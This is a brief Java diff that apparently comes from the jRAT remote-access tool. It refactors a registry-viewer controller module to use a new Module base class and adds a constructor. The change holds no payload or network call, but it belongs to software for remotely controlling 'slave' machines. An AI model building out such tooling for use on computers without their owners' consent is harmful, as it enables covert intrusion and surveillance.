@@ -1,6 +1,6 @@
 package jrat.module.registry;
 
-import jrat.controller.api.ControllerModule;
+import jrat.api.Module;
 import iconlib.IconUtils;
 import jrat.controller.AbstractSlave;
 import jrat.controller.Slave;
@@ -12,7 +12,11 @@ import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
-public class RegistryControllerModule extends ControllerModule {
+public class RegistryControllerModule extends Module {
+
+    public RegistryControllerModule(int seed) {
+        super("Registry Viewer", seed);
+    }
 
     public void init() {
         IncomingPackets.register((short) 54, PacketResult.class);
